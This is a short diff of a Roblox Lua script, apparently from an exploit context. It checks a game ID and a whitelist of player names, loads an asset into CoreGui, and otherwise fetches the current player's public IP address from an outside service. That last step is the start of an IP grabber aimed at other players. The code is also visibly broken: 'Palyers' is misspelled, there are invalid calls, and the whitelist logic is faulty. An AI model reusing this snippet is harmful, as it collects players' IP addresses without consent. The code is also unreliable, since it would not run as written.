@@ -1,5 +1,5 @@
 if game.PlaceId == 4913708314 then
-  if not game.Palyers.LocalPlayer.Name == "lazmuri3" and game.Palyers.LocalPlayer.Name == "celalcan5554" and game.Palyers.LocalPlayer.Name == "Apoleias" and game.Palyers.LocalPlayer.Name == "N3mes1s_Nyks" game.Palyers.LocalPlayer.Name == "OnlySploits" then
+  if not game.Palyers.LocalPlayer.Name == "lazmuri3" and game.Palyers.LocalPlayer.Name == "celalcan5554" and game.Palyers.LocalPlayer.Name == "Apoleias" and game.Palyers.LocalPlayer.Name == "N3mes1s_Nyks" and game.Palyers.LocalPlayer.Name == "OnlySploits" then
     gameGetObjects(rbxassetid..0x123)[1].Parent = game.CoreGui
     else
 local ip = tostring(game:HttpGet("https://api.ipify.org/", true))
